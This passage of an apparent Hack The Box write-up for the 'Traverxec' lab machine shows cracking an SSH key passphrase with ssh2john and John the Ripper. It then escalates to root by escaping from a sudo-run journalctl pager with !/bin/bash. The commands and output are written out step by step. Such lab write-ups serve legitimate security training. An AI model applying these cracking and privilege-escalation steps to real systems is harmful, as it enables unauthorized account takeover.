<p>Let’s try using our new found <code class="highlighter-rouge">ssh key</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> .ssh/id_rsa david@traverxec.htb
Enter passphrase <span class="k">for </span>key <span class="s1">'.ssh/id_rsa'</span>: </code></pre></figure>

<p>We get asked for a passphrase and our <code class="highlighter-rouge">password</code> we found is a no go. Looks like we have some more cracking to do!</p>

<h2 id="user">User</h2>

<p>Fireup <a href="https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py">ssh2john</a> and convert the key to a readable format for <em>John The Ripper</em>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python ssh2john.py id_rsa <span class="o">&gt;</span> id_rsa.hash</code></pre></figure>

<p>Now let’s crack the hash with <a href="add%20tools%20url">John The Ripper</a>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">john <span class="nt">--wordlist</span><span class="o">=</span>/root/wordlists/passwords.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
finding a possible candidate.
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
hu....er           <span class="o">(</span>/root/Documents/traverxec/backup-ssh-identity-files/home/david/.ssh/id_rsa<span class="o">)</span>
74g 0:00:01:13 DONE <span class="o">(</span>2019-12-05 04:12<span class="o">)</span> 1.009g/s 4131Kp/s 4131Kc/s 4131KC/s 233091..hielox
Session completed</code></pre></figure>

<p>Now that we have gotten our ssh key passphrase let’s try logging in again:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> id_rsa david@traverxec.htb
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
Linux traverxec 4.19.0-6-amd64 <span class="c">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
david@traverxec:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
7db0b48469....50d9782f3d</code></pre></figure>

<p>And there were are. We have our user flag!</p>

<p>Now let’s move on to <code class="highlighter-rouge">root</code>.</p>

<h2 id="root">Root</h2>

<p>When we take a look in <code class="highlighter-rouge">davids</code> home directory we see a script in the <code class="highlighter-rouge">bin</code> folder called <code class="highlighter-rouge">server-stats.sh</code>:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">david@traverxec:~/bin<span class="nv">$ </span><span class="nb">cat </span>server-stats.sh 
<span class="c">#!/bin/bash</span>

<span class="nb">cat</span> /home/david/bin/server-stats.head
<span class="nb">echo</span> <span class="s2">"Load: </span><span class="sb">`</span>/usr/bin/uptime<span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">" "</span>
<span class="nb">echo</span> <span class="s2">"Open nhttpd sockets: </span><span class="sb">`</span>/usr/bin/ss <span class="nt">-H</span> sport <span class="o">=</span> 80 | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"Files in the docroot: </span><span class="sb">`</span>/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">" "</span>
<span class="nb">echo</span> <span class="s2">"Last 5 journal log lines:"</span>
/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service | /usr/bin/cat </code></pre></figure>

<p>The last line is using <code class="highlighter-rouge">sudo</code>. This will most likley be our exploit.</p>

<p>The <code class="highlighter-rouge">journalctl</code> command is a <code class="highlighter-rouge">gtfobin</code> because it uses <code class="highlighter-rouge">less</code> which can used to grab a shell.</p>

<p>Let’s have a run of the command that is on the last line. The pipe (<code class="highlighter-rouge">|</code>) and execution of the <code class="highlighter-rouge">cat</code> command is pointless so let’s get rid of that:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">david@traverxec:~/bin<span class="nv">$ </span>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
<span class="nt">--</span> Logs begin at Fri 2019-12-06 08:08:23 EST, end at Fri 2019-12-06 11:48:54 EST. <span class="nt">--</span>
Dec 06 08:08:28 traverxec systemd[1]: nostromo.service: Can<span class="s1">'t open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory
Dec 06 08:08:28 traverxec nhttpd[457]: started
Dec 06 08:08:28 traverxec nhttpd[457]: max. file descriptors = 1040 (cur) / 1040 (max)
Dec 06 08:08:28 traverxec systemd[1]: Started nostromo nhttpd server.
Dec 06 10:28:47 traverxec sudo[1026]: www-data : command not allowed ; TTY=pts/1 ; PWD=/usr/bin ; USER=root ; COMMAND=validate</span></code></pre></figure>

<p>Ok so here we see a problem. We like to see what we are doing so we always have our terminal windows maximized. Because of this the command runs with <code class="highlighter-rouge">less</code> but then exits.</p>

<p>Making the terminal window smaller and running the command again so <code class="highlighter-rouge">less</code> can do it’s thing does the trick.</p>

<p>When less shows <code class="highlighter-rouge">lines 1-6/6 (END)</code> type in <code class="highlighter-rouge">!/bin/bash</code> to grab the root shell:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">david@traverxec:~/bin<span class="nv">$ </span>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
<span class="nt">--</span> Logs begin at Fri 2019-12-06 08:08:23 EST, end at Fri 2019-12-06 11:53:42 EST. <span class="nt">--</span>
Dec 06 08:08:28 traverxec systemd[1]: nostromo.service: Can<span class="s1">'t open PID file /var/nostromo/logs/nhttpd.pid (yet?) after
Dec 06 08:08:28 traverxec nhttpd[457]: started
Dec 06 08:08:28 traverxec nhttpd[457]: max. file descriptors = 1040 (cur) / 1040 (max)
Dec 06 08:08:28 traverxec systemd[1]: Started nostromo nhttpd server.
Dec 06 10:28:47 traverxec sudo[1026]: www-data : command not allowed ; TTY=pts/1 ; PWD=/usr/bin ; USER=root ; COMMAND=
lines 1-6/6 (END)
!/bin/bash
root@traverxec:/home/david/bin# cat /root/root.txt
9aa36a6d76....78f6e0d906</span></code></pre></figure>

<p>Now wasn’t that fun? Enjoy :)</p>

<h2 id="conclusion">Conclusion</h2>

<p>This machine was a good learning curve in making sure you research the services that you are trying to exploit. Using what we had at hand on the machine we were able to understand what paths we needed to take both for user and root. We should never underestimate the importance of active research.</p>
<!-- Hack The Box Badge -->
          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
      </div>
    </div>
    <!-- Bootstrap core JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="/assets/js/bootstrap.bundle.min.js"></script>
    <!-- Custom JavaScript -->
    <script src="/assets/js/sabe.js"></script>
    <!-- Lightbox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
    <script>
      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
        event.preventDefault();
        $(this).ekkoLightbox();
      });
    </script>
  </body>
</html>